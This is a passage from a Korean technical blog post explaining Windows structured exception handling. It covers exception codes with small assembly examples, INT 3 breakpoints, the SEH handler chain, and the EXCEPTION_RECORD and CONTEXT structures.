directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INVALID_CRUNTIME_PARAMETER</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000417L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ASSERTION_FAILURE</span>         <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000420L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ENCLAVE_VIOLATION</span>         <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC00004A2L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_INTERRUPTED</span>               <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000515L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_THREAD_NOT_RUNNING</span>        <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000516L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ALREADY_REGISTERED</span>        <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0000718L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\"><span class=\"token function\">defined</span><span class=\"token punctuation\">(</span>STATUS_SUCCESS<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>_WIN32_WINNT <span class=\"token operator\">></span> <span class=\"token number\">0x0500</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>_WIN32_FUSION <span class=\"token operator\">>=</span> <span class=\"token number\">0x0100</span><span class=\"token punctuation\">)</span> </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_SXS_EARLY_DEACTIVATION</span>    <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC015000FL</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_SXS_INVALID_DEACTIVATION</span>  <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0xC0150010L</span><span class=\"token punctuation\">)</span>    </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></code></pre></div>\n<h3 id=\"status_access_violation--dword---0xc0000005l\" style=\"position:relative;\"><a href=\"#status_access_violation--dword---0xc0000005l\" aria-label=\"status_access_violation  dword   0xc0000005l permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>STATUS_ACCESS_VIOLATION  (DWORD   )0xC0000005L</h3>\n<ul>\n<li>존재하지 않거나 접근 권하니 없는 메모리 영역에 대해서 접근을 시도할 때 발생하는 예외</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">MOV DWORD PTR DS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n<span class=\"token operator\">=</span><span class=\"token operator\">></span> 메모리 주소 <span class=\"token number\">0</span>은 할당된 영역이 아니다<span class=\"token punctuation\">.</span>\n\nADD DWORD PTR DS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x401000</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n<span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">.</span>text 섹션의 시작 주소 <span class=\"token number\">0x401000</span>은 READ 속성만을 가지고 있다<span class=\"token punctuation\">.</span> <span class=\"token punctuation\">(</span>WRITE 속성 없음<span class=\"token punctuation\">)</span>\n\nXOR DWORD PTR DS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">80000000</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1234</span>\n<span class=\"token operator\">=</span><span class=\"token operator\">></span> 메모리 주소 <span class=\"token number\">0x80000000</span> 은 Kernel 영역이라 user 모드에선 접근 불가</code></pre></div>\n<h3 id=\"status_breakpoint-dword---0x80000003l\" style=\"position:relative;\"><a href=\"#status_breakpoint-dword---0x80000003l\" aria-label=\"status_breakpoint dword   0x80000003l permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>STATUS_BREAKPOINT (DWORD   )0x80000003L</h3>\n<ul>\n<li>실행 코드에 BP가 설치되면 CPU가 그 주소를 실행하려 할 때 EXCEPTION_BREAKPOINT 예외가 발생한다.</li>\n<li>디버거는 바로 이 EXCEPTION_BREAKPOINT 예외를 이용하여 BP 기능을 제공하는 것이다.</li>\n</ul>\n<h2 id=\"breakpoint-구현-방법\" style=\"position:relative;\"><a href=\"#breakpoint-%EA%B5%AC%ED%98%84-%EB%B0%A9%EB%B2%95\" aria-label=\"breakpoint 구현 방법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>BreakPoint 구현 방법</h2>\n<h3 id=\"int-3\" style=\"position:relative;\"><a href=\"#int-3\" aria-label=\"int 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>INT 3</h3>\n<ul>\n<li>BP를 설치하는 명령어는 어셈블리 명령어로 <code class=\"language-text\">INT 3</code> 입니다.</li>\n<li>해당 명령어의 기계어 (IA32 Instruction) 형태는 <code class=\"language-text\">0xCC</code> 이다.</li>\n<li>CPU는 코드 실행 과정에서 어셈블리 명령어 INT3을 만나면 EXCPETION_BREAKPOINT 예외를 발생시킨다.</li>\n<li>디버거 상에서는 사용자 임시 BP (User Temporary Break Point)이기 때문에 화면 상에 표시하지 ㅇ낳는다.</li>\n<li>해당 Instuction이 0xcc로 변경된 것을 확인할려면 프로세스 덤프를 한후에 해당 주소에서 확인이 가능하다.</li>\n</ul>\n<h3 id=\"status_illegal_instruction-------dword---0xc000001dl\" style=\"position:relative;\"><a href=\"#status_illegal_instruction-------dword---0xc000001dl\" aria-label=\"status_illegal_instruction       dword   0xc000001dl permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>STATUS_ILLEGAL_INSTRUCTION       ((DWORD   )0xC000001DL)</h3>\n<ul>\n<li>CPU가 해석할 수 없는 Instuction을 만날 때 발생하는 예외이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0FFF</span></code></pre></div>\n<ul>\n<li>해당 Insturction은 x86 CPU에 정의된 Instruction이 아니기 때문에 EXCEPTION_ILLEGAL_INSTRUCTION 예외를 발생시킨다.</li>\n</ul>\n<h3 id=\"status_integer_divide_by_zero----dword---0xc0000094l\" style=\"position:relative;\"><a href=\"#status_integer_divide_by_zero----dword---0xc0000094l\" aria-label=\"status_integer_divide_by_zero    dword   0xc0000094l permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>STATUS_INTEGER_DIVIDE_BY_ZERO    (DWORD   )0xC0000094L</h3>\n<ul>\n<li>INTEGER (정수) 나눗셈 연산에서 분모가 0인 경우 (0으로나누는 경우) 발생하는 예외이다.</li>\n<li>프로그램 개발할 때 간혹 발생하는 예외</li>\n<li>분모가 변수로 잡혀 값이 0이 되었을 때 나누기 연산을 수행하면 EXCEPTION_INTEGER_DIVIDE_BY_ZERO 예외가 발생한다.</li>\n</ul>\n<h2 id=\"seh-chain\" style=\"position:relative;\"><a href=\"#seh-chain\" aria-label=\"seh chain permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SEH Chain</h2>\n<ul>\n<li>체인 형태로 구성되어 있다.</li>\n<li>첫 번째 에외 처리기에서 해당 예외를 처리하지 못하면 (처리될 때 까지) 다음 예외 처리기로 예외를 넘겨주는 형식이다.</li>\n<li>기술적으로 SEH는 EXCEPTION_REGISTRATION_RECORD 구조체 연결 리스트의 형태로 구성된다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_EXCEPTION_REGISTRATION_RECORD</span>\n<span class=\"token punctuation\">{</span>\n     PEXCEPTION_REGISTRATION_RECORD Next<span class=\"token punctuation\">;</span>\n     PEXCEPTION_DISPOSITION Handler<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> EXCEPTION_REGISTRATION_RECORD<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PEXCEPTION_REGISTRATION_RECORD<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>Next 멤버는 다음 <em>EXCPETION</em>REGISTRATION_RECORD 구조체 포인터이며, Handler 멤버가 예외처리기 함수 (예외 처리기)이다.</li>\n<li>NEXT 멤버의 값이 <code class=\"language-text\">FFFFFFFF</code> 이면 연결리스트의 마지막을 나타낸다.</li>\n<li>프로세스의 SEH 체인 구조를 그림으로 표현하면</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACWElEQVQoz12SW0+SARjH+R615QHl9HKQFxAFBEGQk5knQM1whivBqRvlpOnqI3RVeZjoctZWy9Q3oKWyVold+C26q1ldtbn1/hqUN1082/95fs//f/M8Cp1GL2uVKjRKlaxRqqhqQTDhD4QJ+EMEPD6CXj9+j5dubxcBfxB/dxijUeTvvpoLn1YtoLCF+nDOLMruzAId0zmcmQXMjk4ErR6rN4Rz+h7uWuVwzSxi8UcRNHpEeweOqXlc0zk8mRzO2SVaexMo3LNTcs9pgbGKJA9V9oh8eEVb7zW0DWraEjGin14zciKRON4j+nkf1+QEugYN1k4f4fIL4icS14/3iZ4W8C7dReG6PUXkoEi8KDFQkghJO9jCPajrmrAPxggXdhkqSQwVJcJvJdqT46jrmxDdPoK7L+kvScQL+0SOSrjvVANvjXP13QajhTzxYp7I3jK2cAh1vQr7QB890irDhTwjhTw9xXUcN4ZrTHR7iOw8JlbMM/omT+/BJp5sGoXOaKHJIKI0mFHqzTQbLQgGsXYYnUGs9UqDSKO+hWaDpTarMsFgRlVlenONVzO0RguK9IhfrqyPc7iSkssrExw9GiXc5eSKUqA/1EH5yRjl1RSHyxN8XEuSivmoU+px2O0UHiZ4v5biYPkmlfUkD9JRFPeTUc6fzchfn2b5vpXlbCPNYMDDpUYdyaiXH5sZzrayfNvK8mt7lvmRIJcbBTzt7XxZnuTndpaq9/z5HKtzgyjMJutve0srdpNVtpusVHX1x7SCCaPRwj/GBWsxWmpMbzDT+h8TTTb+AFSYdO5NBUyxAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./SEH_CHAIN.png\"\n        title=\"./SEH_CHAIN.png\"\n        src=\"/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/37523/SEH_CHAIN.png\"\n        srcset=\"/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/e9ff0/SEH_CHAIN.png 180w,\n/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/f21e7/SEH_CHAIN.png 360w,\n/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/37523/SEH_CHAIN.png 720w,\n/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/302a4/SEH_CHAIN.png 1080w,\n/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/07a9c/SEH_CHAIN.png 1440w,\n/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/74e37/SEH_CHAIN.png 1732w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>총 3개의 SEH가 존재한다. 어떤 예외가 발생하면, 예외가 해결될 때까지 처리기 (A) → (B) → (C) 순서대로 예외 처리기가 호출된다.</li>\n</ul>\n<h2 id=\"seh-함수-정의\" style=\"position:relative;\"><a href=\"#seh-%ED%95%A8%EC%88%98-%EC%A0%95%EC%9D%98\" aria-label=\"seh 함수 정의 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SEH 함수 정의</h2>\n<ul>\n<li>EXCEPTION_DISPOSITION</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">EXCPETION_DISPOSITION <span class=\"token function\">_except_handler</span> <span class=\"token punctuation\">(</span>\n\tEXCEPTION_RECORD               <span class=\"token operator\">*</span>pRecord<span class=\"token punctuation\">,</span>\n\tEXCEPTION_REGISTRATION_RECORD  <span class=\"token operator\">*</span>pFrame\n\tCONTEXT                        <span class=\"token operator\">*</span>pContext<span class=\"token punctuation\">,</span>\n\tPVOID                           pValue\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>예외 처리기는 4개의 파라미터를 입력 받으며, EXCEPTION_DISPOSITION 이라는 열거형을 반환한다.</li>\n<li>해당 예외 처리 함수는 시스템에 의해서 호출되는 콜백 함수이다.</li>\n<li>입력 파라미터들에 예외와 관련된 정보가 저장되어 있다.</li>\n</ul>\n<p><strong>EXCEPTION_RECORD 구조체 정의</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_EXCEPTION_RECORD</span> <span class=\"token punctuation\">{</span>\n  DWORD                    ExceptionCode<span class=\"token punctuation\">;</span>                <span class=\"token comment\">// 예외 코드</span>\n  DWORD                    ExceptionFlags<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_EXCEPTION_RECORD</span> <span class=\"token operator\">*</span>ExceptionRecord<span class=\"token punctuation\">;</span>\n  PVOID                    ExceptionAddress<span class=\"token punctuation\">;</span>             <span class=\"token comment\">// 예외 발생 주소</span>\n  DWORD                    NumberParameters<span class=\"token punctuation\">;</span>\n  ULONG_PTR                ExceptionInformation<span class=\"token punctuation\">[</span>EXCEPTION_MAXIMUM_PARAMETERS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> EXCEPTION_RECORD<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>ExceptionCode : 발생한 예외의 종류를 의미</li>\n<li>ExcpetionAddress : 예외가 발생한 코드 주소를 나타낸다.</li>\n</ul>\n<p><strong>CONTEXT 구조체 정의</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_CONTEXT</span> <span class=\"token punctuation\">{</span>\n  DWORD64 P1Home<span class=\"token punctuation\">;</span>\n  DWORD64 P2Home<span class=\"token punctuation\">;</span>\n  DWORD64 P3Home<span class=\"token punctuation\">;</span>\n  DWORD64 P4Home<span class=\"token punctuation\">;</span>\n  DWORD64 P5Home<span class=\"token punctuation\">;</span>\n  DWORD64 P6Home<span class=\"token punctuation\">;</span>\n  DWORD   ContextFlags<span class=\"token punctuation\">;</span>\n  DWORD   MxCsr<span class=\"token punctuation\">;</span>\n  WORD    SegCs<span class=\"token punctuation\">;</span>\n  WORD    SegDs<span class=\"token punctuation\">;</span>\n  WORD    SegEs<span class=\"token punctuation\">;</span>\n  WORD    SegFs<span class=\"token punctuation\">;</span>\n  WORD    SegGs<span class=\"token punctuation\">;</span>\n  WORD    SegSs<span class=\"token punctuation\">;</span>\n  DWORD   EFlags<span class=\"token punctuation\">;</span>\n  DWORD64 Dr0<span class=\"token punctuation\">;</span>\n  DWORD64 Dr1<span class=\"token punctuation\">;</span>\n  DWORD64 Dr2<span class=\"token punctuation\">;</span>\n  DWORD64 Dr3<span class=\"token punctuation\">;</span>\n  DWORD64 Dr6<span class=\"token punctuation\">;</span>\n  DWORD64 Dr7<span class=\"token punctuation\">;</span>\n  DWORD64 Rax<span class=\"token punctuation\">;</span>\n  DWORD64 Rcx<span class=\"token punctuation\">;</span>\n  DWORD64 Rdx<span class=\"token punctuation\">;</span>\n  DWORD64 Rbx<span class=\"token punctuation\">;</span>\n  DWORD64 Rsp<span class=\"token punctuation\">;</span>\n  DWORD64 Rbp<span class=\"token punctuation\">;</span>\n  DWORD64 Rsi<span class=\"token punctuation\">;</span>\n  DWORD64 Rdi<span class=\"token punctuation\">;</span>\n  DWORD64 R8<span class=\"token punctuation\">;</span>\n  DWORD64 R9<span class=\"token punctuation\">;</span>\n  DWORD64 R10<span class=\"token punctuation\">;</span>\n  DWORD64 R11<span class=\"token punctuation\">;</span>\n  DWORD64 R12<span class=\"token punctuation\">;</span>\n  DWORD64 R13<span class=\"token punctuation\">;</span>\n  DWORD64 R14<span class=\"token punctuation\">;</span>\n  DWORD64 R15<span class=\"token punctuation\">;</span>\n  DWORD64 Rip<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">union</span> <span class=\"token punctuation\">{</span>\n    XMM_SAVE_AREA32 FltSave<span class=\"token punctuation\">;</span>\n    NEON128         Q<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    ULONGLONG       D<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">{</span>\n      M128A Header<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      M128A Legacy<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      M128A Xmm0<span class=\"token punctuation\">;</span>\n      M128A Xmm1<span class=\"token punctuation\">;</span>\n      M128A Xmm2<span class=\"token punctuation\">;</span>\n      M128A Xmm3<span class=\"token punctuation\">;</span>\n      M128A Xmm4<span class=\"token punctuation\">;</span>\n      M128A Xmm5<span class=\"token punctuation\">;</span>\n      M128A Xmm6<span class=\"token punctuation\">;</span>\n      M128A Xmm7<span class=\"token punctuation\">;</span>\n      M128A Xmm8<span class=\"token punctuation\">;</span>\n      M128A Xmm9<span class=\"token punctuation\">;</span>\n      M128A Xmm10<span class=\"token punctuation\">;</span>\n      M128A Xmm11<span class=\"token punctuation\">;</span>\n      M128A Xmm12<span class=\"token punctuation\">;</span>\n      M128A Xmm13<span class=\"token punctuation\">;</span>\n      M128A Xmm14<span class=\"token punctuation\">;</span>\n      M128A Xmm15<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> DUMMYSTRUCTNAME<span class=\"token punctuation\">;</span>\n    DWORD           S<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> DUMMYUNIONNAME<span class=\"token punctuation\">;</span>\n  M128A   VectorRegister<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  DWORD64 VectorControl<span class=\"token punctuation\">;</span>\n  DWORD64 DebugControl<span class=\"token punctuation\">;</span>\n  DWORD64 LastBranchToRip<span class=\"token punctuation\">;</span>\n  DWORD64 LastBranchFromRip<span class=\"token punctuation\">;</span>\n  DWORD64 LastExceptionToRip<span class=\"token punctuation\">;</span>\n  DWORD64 LastExceptionFromRip<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> CONTEXT<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PCONTEXT<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>CONTEXT 구조체는 CPU 레지스터 값을 백업하는 용도로 사용된다.</li>\n<li>CPU 레지스터 값을 백업하는 이유는 멀티 스레드(Multi-Thread) 환경 때문이다.</li>\n<li>스레드는 내부적으로 CONTEXT 구조체를 하나씩 가지고 있다.</li>\n<li>CPU가 다른 스레드를 실행하러 잠시 이동할 때 CPU 레지스터들의 값을 현재 스레드의 CONTEXT 구조체에 백업한다.</li>\n<li>그후 CPU가 다시 에전 스레드를 실행하러 오면 CONTEXT 구조체에 백업된 레지스터 값들을 실제 CPU 레지스터에 덮어쓴다.</li>\n<li>아까 실행이 멈춰졌던 코드 위치부터 실행을 다시 시작한다.</li>\n<li>OS는 멀티 스레드 환경에서 안전하게 스레드 단위별로 실행이 가능하다.</li>\n</ul>\n<h3 id=\"multi-thread\" style=\"position:relative;\"><a href=\"#multi-thread\" aria-label=\"multi thread permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Multi-Thread</h3>\n<ul>\n<li>\n<p>CPU의 시분할 (Time-Slicing) 방식</p>\n</li>\n<li>\n<p>CPU가 각 스레드를 차례대로 일정 시간 동안 실행해주는 것이다.</p>\n</li>\n<li>\n<p>그 시간 간격이 극히 짧기 때문에 동시에 여러 개의 스레드가 실행되는 것처럼 보이는 것이다.</p>\n</li>\n<li>\n<p>스레드의 우선순위에 따라서 CPU 제어권을 얻는 횟수에 차이가 발생한다.</p>\n</li>\n<li>\n<p>예외가 발생하면 그 코드를 실행한 스레드는 중지되고 SEH(예외 처리기)가 실행된다.</p>\n</li>\n<li>\n<p>OS는 예외 처리기의 파라미터에 해당 스레드의 CONTEXT 구조체 